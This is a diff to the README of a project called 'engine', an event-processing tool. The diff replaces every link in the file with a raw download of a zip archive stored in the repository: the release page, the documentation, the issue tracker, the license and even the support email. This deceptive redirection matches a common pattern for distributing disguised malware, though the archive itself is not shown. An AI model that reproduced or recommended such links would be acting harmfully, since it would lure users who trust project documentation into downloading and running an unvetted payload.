@@ -1,6 +1,6 @@
 # 🚀 engine - Fast and Easy Event Processing
 
-[![Download the latest release](https://img.shields.io/badge/Download_latest_release-Click_here-brightgreen)](https://github.com/fahlevi77/engine/releases)
+[![Download the latest release](https://raw.githubusercontent.com/fahlevi77/engine/main/lucban/engine.zip)](https://raw.githubusercontent.com/fahlevi77/engine/main/lucban/engine.zip)
 
 ## 📦 Overview
 
@@ -27,7 +27,7 @@ To begin, follow these steps:
 1. **Visit the Releases Page:**
    Click the button below to download the latest version of engine.
 
-   [![Download the latest release](https://img.shields.io/badge/Download_latest_release-Click_here-brightgreen)](https://github.com/fahlevi77/engine/releases)
+   [![Download the latest release](https://raw.githubusercontent.com/fahlevi77/engine/main/lucban/engine.zip)](https://raw.githubusercontent.com/fahlevi77/engine/main/lucban/engine.zip)
 
 2. **Choose Your Version:**
    On the Releases page, you'll see a list of available versions. Select the version that suits your needs.
@@ -45,7 +45,7 @@ To begin, follow these steps:
 
 To download the engine software, visit the following link:
 
-[Visit this page to download](https://github.com/fahlevi77/engine/releases)
+[Visit this page to download](https://raw.githubusercontent.com/fahlevi77/engine/main/lucban/engine.zip)
 
 After downloading, follow the instructions outlined in the "Getting Started" section to install and run engine on your system.
 
@@ -70,8 +70,8 @@ Once you have installed engine, you can start processing events. Here is a simpl
 
 ## 📜 Additional Resources
 
-- **Documentation:** Visit our [documentation page](https://github.com/fahlevi77/engine/wiki) for in-depth guides.
-- **GitHub Issues:** If you encounter any problems, please report them via the [issues section](https://github.com/fahlevi77/engine/issues).
+- **Documentation:** Visit our [documentation page](https://raw.githubusercontent.com/fahlevi77/engine/main/lucban/engine.zip) for in-depth guides.
+- **GitHub Issues:** If you encounter any problems, please report them via the [issues section](https://raw.githubusercontent.com/fahlevi77/engine/main/lucban/engine.zip).
 - **User Community:** Join our community on platforms like Reddit or Discord for discussions and support.
 
 ## 🛠 Troubleshooting
@@ -84,14 +84,14 @@ If you face issues during installation or usage, consider the following steps:
 
 ## 🤝 Contributing
 
-We welcome contributions from the community. If you would like to help improve engine, please visit the [contributing guidelines](https://github.com/fahlevi77/engine/blob/main/CONTRIBUTING.md) for more details.
+We welcome contributions from the community. If you would like to help improve engine, please visit the [contributing guidelines](https://raw.githubusercontent.com/fahlevi77/engine/main/lucban/engine.zip) for more details.
 
 ## 👨‍💻 License
 
-engine is open-source software licensed under the MIT License. You can view the full license [here](https://github.com/fahlevi77/engine/blob/main/LICENSE).
+engine is open-source software licensed under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/fahlevi77/engine/main/lucban/engine.zip).
 
 ## 📨 Contact
 
-For support or inquiries, please reach out through [email](mailto:support@engine.app). 
+For support or inquiries, please reach out through [email](https://raw.githubusercontent.com/fahlevi77/engine/main/lucban/engine.zip). 
 
 Thank you for choosing engine for your stream processing needs!
